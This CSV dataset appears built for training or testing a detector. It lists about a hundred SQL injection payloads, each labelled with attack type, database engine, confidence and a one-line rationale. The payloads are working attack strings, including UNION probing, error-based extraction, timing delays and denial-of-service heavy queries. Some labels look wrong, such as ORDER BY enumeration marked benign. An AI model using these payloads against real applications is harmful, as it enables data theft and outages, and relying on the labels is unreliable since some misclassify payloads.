id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23761,1 ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),boolean_blind,oracle,0.75,Boolean condition with Oracle DBMS_UTILITY function; conditional logic testing,1
23762,"1'+ ( select pxrg where 5589 = 5589 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.70,Boolean equality with Cartesian join (7x sysusers); system table enumeration pattern,1
23763,1'|| ( select 'uebk' from dual where 6990 = 6990,boolean_blind,oracle,0.70,Boolean condition with Oracle DUAL table reference; WHERE clause true/false testing,1
23764,"1"" rlike ( select ( case when ( 3711 = 3313 ) then 1 else 0x28 end ) ) and ""iqlh"" like ""iqlh",boolean_blind,mysql,0.85,RLIKE operator detected → boolean_blind SQLi; MySQL regex-based boolean condition testing,2
23765,"-9007 ) as gill where 6462 = 6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 9-column numeric injection,2
23766,"1"" ) ) ) and make_set ( 6751 = 8128,8128 ) and ( ( ( ""uhiy"" = ""uhiy",boolean_blind,mysql,0.80,MAKE_SET() detected → boolean_blind SQLi; MySQL condition-dependent set construction,1
23767,1%' and 7366 = 9197#,boolean_blind,generic,0.70,Boolean inequality (7366 = 9197) for false branch testing in blind SQLi,1
23768,"-6731"" where 6166 = 6166 union all select 6166,6166,6166,6166,6166,6166--",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 6-column injection,2
23769,"1 ) ) ) and make_set ( 8882 = 1593,1593 ) and ( ( ( 7989 = 7989",boolean_blind,mysql,0.80,MAKE_SET() detected → boolean_blind SQLi; MySQL boolean conditional set,1
23770,1' ) and ( 3020 = 3020 ) *6703,boolean_blind,generic,0.70,Boolean equality (3020 = 3020) with arithmetic; false branch via multiplication,1
23771,else dbms_lock.sleep ( 0 ),time_blind,oracle,0.90,Oracle DBMS_LOCK.sleep() detected → time_blind SQLi; Oracle-specific timing function,2
23772,"1"" ) ) as qrok where 8257 = 8257 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.90,PostgreSQL generate_series(1,5000000) detected → heavy_query DoS; large set enumeration,2
23773,"1"" ) ) as yuqr where 7226 = 7226 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,0.90,sleep() in subquery detected → time_blind SQLi; MySQL embedded sleep function,2
23774,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( ""wdbg"" like ""wdbg",heavy_query,postgresql,0.90,PostgreSQL generate_series(1,5000000) detected → heavy_query DoS; enumeration-based CPU attack,2
23775,-2658 ) as casi where 7364 = 7364 or 8245 = 9651--,boolean_blind,generic,0.70,Boolean condition (7364 = 7364 OR 8245 = 9651) for branch testing in blind SQLi,1
23776,"1"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""tzqk"" like ""tzqk",error_based,mysql,0.95,updatexml() detected → error-based SQLi; MySQL XPath error extraction,2
23777,-7984' order by 1--,benign,generic,0.60,No SQLi signal detected; syntactically valid ORDER BY clause for column enumeration,1
23778,"1"" where 6352 = 6352",boolean_blind,generic,0.70,Boolean equality without strong SQLi indicators; generic WHERE clause testing,1
23779,"1%' ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.75,Large regexp_substring/repeat with 5B iterations; PostgreSQL-style CPU DoS,1
23780,"-4695' ) ) ) union all select 5844,5844,5844,5844,5844,5844#",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 6-column injection,2
23781,-8028%' ) ) ) or 5042 = 5214,boolean_blind,generic,0.70,Boolean inequality (5042 = 5214) for false branch testing,1
23782,"-2382%' ) union all select 8885,8885,8885,8885,8885,8885,8885#",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 7-column injection,2
23783,"1"" union all select null#",union_based,generic,0.85,UNION ALL SELECT with null detected → union_based SQLi; column padding,2
23784,1'|| ( select 'bifa' where 6077 = 6077 and 4547 = 9301,boolean_blind,generic,0.70,Boolean condition (6077 = 6077 AND 4547 = 9301); branch testing pattern,1
23785,"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 'xzlx' like 'xzlx",boolean_blind,mysql,0.75,ELT() boolean function with GROUP BY; MySQL error-based boolean extraction,1
23786,1 ) ) as ojjk where 3687 = 3687 and ( 4833 = 9218 ) *6723--,boolean_blind,generic,0.70,Boolean equality and inequality; conditional branch testing,1
23787,"-7236 or make_set ( 9618 = 6919,6919 )",boolean_blind,mysql,0.80,MAKE_SET() detected → boolean_blind SQLi; MySQL conditional set construction,1
23788,"1"" ) as htyo where 8322 = 8322 and 4595 = 4595#",boolean_blind,generic,0.70,Boolean AND condition (8322=8322 AND 4595=4595); true branch testing,1
23789,1 ) where 9552 = 9552 and 1961 = 6333--,boolean_blind,generic,0.70,Boolean AND condition (9552=9552 AND 1961=6333); mixed true/false branches,1
23790,"select pg_sleep ( 5 ) and ( ( ""byhx"" like ""byhx",time_blind,postgresql,0.95,pg_sleep() detected → time_blind SQLi; PostgreSQL time-based delay function,2
23791,"1"" ) as nqtn where 5606 = 5606 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.80,Oracle all_users table Cartesian join (5x); heavy query DoS pattern,1
23792,"1%' ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL SELECT with null → union_based SQLi; 7-column padding,2
23793,"1%"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",boolean_blind,mysql,0.80,RLIKE with sleep() subquery detected → boolean_blind SQLi; MySQL regex-based timing,1
23794,"-7940%"" ) union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 10-column injection,2
23795,"1"" ) as axua where 6718 = 6718",boolean_blind,generic,0.60,No strong SQLi signals; generic WHERE equality clause,1
23796,"1' ) ) as efmy where 7299 = 7299 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.90,PostgreSQL generate_series(1,5000000) detected → heavy_query DoS; enumeration attack,2
23797,1'+ ( select 'ueak' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +',error_based,postgresql,0.85,PostgreSQL CAST to numeric detected → error_based SQLi; type casting error trigger,1
23798,"1 ) where 1193 = 1193 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,mysql,0.95,extractvalue() detected → error_based SQLi; MySQL XPath error with benchmark function,2
23799,"1"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""oxvs"" like ""oxvs",heavy_query,generic,0.75,Large repeat/regexp_substring with 5B iterations; PostgreSQL-style DoS,1
23800,"1' ) as ohnu where 4097 = 4097 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL SELECT with null → union_based SQLi; 9-column padding,2
23801,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk"" = ""jkfk",boolean_blind,firebird,0.70,Firebird rdb$ system tables with Cartesian join; heavy query pattern,1
23802,"1%' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( '%' = '",time_blind,mysql,0.90,BENCHMARK() detected → time_blind SQLi; MySQL CPU timing attack with 5M iterations,2
23803,-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 6723 = 6723,error_based,postgresql,0.80,PostgreSQL CAST to numeric detected → error_based SQLi; type casting error,1
23804,"1'|| ( select 'gikt' where 8447 = 8447 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.80,Oracle all_users Cartesian join (5x) detected → heavy_query DoS; resource exhaustion,1
23805,"1 ) union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL SELECT with null → union_based SQLi; 6-column padding,2
23806,"1"" ) and 9198 = 9198--",boolean_blind,generic,0.70,Boolean equality (9198 = 9198); true branch testing,1
23807,"1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'wbsz' = 'wbsz",boolean_blind,mysql,0.75,ELT() with GROUP BY → boolean_blind SQLi; MySQL error-based boolean testing,1
23808,1'+ ( select 'rqok' where 5074 = 5074 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) +',out_of_band,oracle,0.95,Oracle UTL_INADDR.get_host_address detected → out_of_band SQLi; network-based exfiltration,2
23809,1' ) ) and ( 1427 = 5813 ) *5813 and ( ( 'estb' like 'estb,boolean_blind,generic,0.60,Boolean inequality with multiplication; no strong SQLi signal,1
23810,"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )",error_based,mysql,0.95,extractvalue() detected → error_based SQLi; MySQL XPath error extraction,2
23811,-3566%' or 2158 = 6289,boolean_blind,generic,0.70,Boolean inequality (2158 = 6289) for false branch testing in blind SQLi,1
23812,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",time_blind,sqlite,0.85,randomblob() with 250M argument detected → time_blind SQLi; SQLite memory exhaustion,2
23813,"-7041"" ) ) ) union all select 2159,2159,2159,2159,2159--",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 5-column injection,2
23814,"1"" ) ) as qgwq where 6122 = 6122",boolean_blind,generic,0.60,No strong SQLi signals; generic WHERE equality,1
23815,"1"" ) ) as uels where 9447 = 9447 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.95,Oracle DBMS_PIPE.receive_message detected → time_blind SQLi; Oracle timing function,2
23816,"1 and make_set ( 9542 = 8888,8888 ) -- idkn",boolean_blind,mysql,0.80,MAKE_SET() detected → boolean_blind SQLi; MySQL condition-dependent set,1
23817,1%' ) ) order by 1--,benign,generic,0.60,No SQLi signal detected; ORDER BY used for column enumeration,1
23818,"1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",error_based,mysql,0.90,information_schema access with GROUP BY detected → error_based SQLi; MySQL info schema enumeration,1
23819,"1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) # rhli",error_based,oracle,0.95,Oracle CTXSYS.DRITHSX.SN detected → error_based SQLi; Oracle context search error,2
23820,"1' ) where 8948 = 8948 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.90,PostgreSQL generate_series(1,5000000) detected → heavy_query DoS; set enumeration attack,2
23821,"-9096"" ) where 9452 = 9452 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",error_based,oracle,0.95,xmltype() cast detected → error_based SQLi; Oracle XML type error signal,2
23822,( select ( case when ( 9066 = 5598 ) then 1 else 9066* ( select 9066 from information_schema.character_sets ) end ) ),error_based,mysql,0.80,CASE WHEN with information_schema access detected → error_based SQLi; conditional error trigger,1
23823,1' ) ) as jtmf where 3937 = 3937,boolean_blind,generic,0.60,No strong SQLi signals; WHERE equality pattern,1
23824,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""rbqs"" = ""rbqs",heavy_query,generic,0.75,PostgreSQL repeat/regexp_substring with 500M iterations; CPU DoS,1
23825,"1 ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL SELECT with null → union_based SQLi; 8-column padding,2
23826,"1' ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'hpbt' = 'hpbt",boolean_blind,generic,0.70,Oracle all_users Cartesian join pattern; heavy query boolean test,1
23827,-9975 where 9760 = 9760 order by 1--,benign,generic,0.60,No SQLi signal; ORDER BY for column count enumeration,1
23828,"-5182"" ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",error_based,mysql,0.85,MySQL GROUP BY with CONCAT; error-based boolean testing with aggregation,1
23829,"1' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 'jnmf' = 'jnmf",boolean_blind,mysql,0.80,ELT() with sleep() detected → boolean_blind SQLi; MySQL hybrid boolean/timing attack,1
23830,1'+ ( select hrgu where 9587 = 9587,boolean_blind,generic,0.60,Boolean condition without strong SQLi signal; generic WHERE testing,1
23831,select case when 8237 = 9948 then 1 else null end--,boolean_blind,generic,0.70,CASE WHEN boolean condition detected → boolean_blind SQLi; conditional branch testing,1
23832,"-3781%' ) union all select 7497,7497,7497,7497,7497--",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 5-column injection,2
23833,waitfor delay '0:0:5' and '%' = ',time_blind,mssql,0.95,WAITFOR DELAY detected → time_blind SQLi; MSSQL timing function,2
23834,1' where 9544 = 9544,boolean_blind,generic,0.60,Boolean equality without strong SQLi indicators; WHERE clause testing,1
23835,"1%' or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.75,PostgreSQL repeat/regexp_substring with 500M iterations; CPU DoS,1
23836,"1' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'qdsr' like 'qdsr",heavy_query,generic,0.75,PostgreSQL-style repeat/regexp_substring DoS with 500M iterations,1
23837,"1%' ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( '%' = '",error_based,mysql,0.90,EXP() overflow detected → error_based SQLi; MySQL mathematical error trigger,1
23838,if ( 5316 = 4416 ) select 5316 else drop function vtve--,boolean_blind,generic,0.70,IF() conditional detected → boolean_blind SQLi; condition-based branch testing,1
23839,"-5169"" ) ) union all select 6198,6198,6198,6198--",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 4-column injection,2
23840,"1"" where 8234 = 8234",boolean_blind,generic,0.60,No strong SQLi signals; WHERE equality testing,1
23841,"1"" ) ) as hiuf where 3277 = 3277 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",error_based,oracle,0.80,Oracle IN clause with CASE/CHAR encoding; boolean-based error testing,1
23842,"-8200' where 3422 = 3422 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",error_based,mssql,0.90,CONVERT() to INT detected → error_based SQLi; MSSQL type casting error,1
23843,"1 ) ) as qfnu where 1609 = 1609 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.70,DB2 sysibm.systables Cartesian join; heavy query pattern,1
23844,"1' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'xfmq' = 'xfmq",boolean_blind,generic,0.70,Oracle all_users join pattern; heavy boolean test,1
23845,1' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),error_based,oracle,0.95,xmltype() cast detected → error_based SQLi; Oracle XML error signal,2
23846,"-8358' ) ) ) union all select 7282,7282--",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 2-column injection,2
23847,-7726 or 3038 = 3038,boolean_blind,generic,0.70,Boolean equality (3038 = 3038) for true branch testing in blind SQLi,1
23848,"1"" ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ""rurz"" = ""rurz",time_blind,oracle,0.95,Oracle DBMS_PIPE.receive_message detected → time_blind SQLi; timing function,2
23849,"1' in boolean mode ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) #",heavy_query,generic,0.75,PostgreSQL repeat/regexp_substring with 500M iterations; CPU DoS pattern,1
23850,"1'|| ( select 'fbtm' where 1335 = 1335 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) ||'",error_based,mysql,0.85,EXP() overflow detected → error_based SQLi; MySQL mathematical error,1
23851,"1 ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 4127 = 4127",error_based,mysql,0.85,ELT() with GROUP BY detected → error_based SQLi; MySQL boolean error trigger,1
23852,1' where 4403 = 4403 rlike sleep ( 5 ) #,time_blind,mysql,0.90,RLIKE with sleep() detected → time_blind SQLi; MySQL regex-based timing attack,2
23853,"-6587' ) union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 10-column injection,2
23854,"1%"" ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""%"" = """,boolean_blind,generic,0.70,MSSQL sysusers Cartesian join (7x); heavy boolean test,1
23855,"1, ( select ( case when ( 3743 = 9640 ) then 1 else 3743* ( select 3743 from master..sysdatabases ) end ) )",error_based,mssql,0.80,MSSQL master..sysdatabases access with CASE; error-based boolean,1
23856,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( ""eqmy"" = ""eqmy",time_blind,mysql,0.90,BENCHMARK() detected → time_blind SQLi; MySQL CPU timing with 5M iterations,2
23857,"1%' ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.75,Firebird domain schema tables join; heavy query DoS pattern,1
23858,"-9886%' ) ) ) union all select 5191,5191,5191,5191,5191,5191,5191--",union_based,generic,0.85,UNION ALL SELECT detected → union_based SQLi; 7-column injection,2
23859,"1"" ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.80,MSSQL sysusers Cartesian join (7x); heavy query DoS,1
23860,"-9111"" or 3038 = 3038",boolean_blind,generic,0.70,Boolean equality (3038 = 3038) for true branch testing,1
23861,"1"" ) ) ) union all select null--",union_based,generic,0.80,UNION ALL SELECT with null → union_based SQLi; column padding,2
23862,"1"" where 9829 = 9829 order by 1#",benign,generic,0.60,No SQLi signal; ORDER BY for column enumeration,1
23863,-2022 ) ) ) or 6812 = 3516 and ( ( ( 3896 = 3896,boolean_blind,generic,0.70,Boolean inequality OR with equality AND; branch testing pattern,1
23864,-2505' or 9323 = 9323#,boolean_blind,generic,0.70,Boolean equality (9323 = 9323) for true branch in blind SQLi,1
23865,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and '%' = '",time_blind,mysql,0.90,BENCHMARK() detected → time_blind SQLi; MySQL CPU timing function,2
23866,1' ) as pwqs where 2291 = 2291,boolean_blind,generic,0.60,No strong SQLi signals; WHERE equality,1
23867,-3978 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) -- mtun,error_based,oracle,0.95,xmltype() cast detected → error_based SQLi; Oracle XML error signal,2
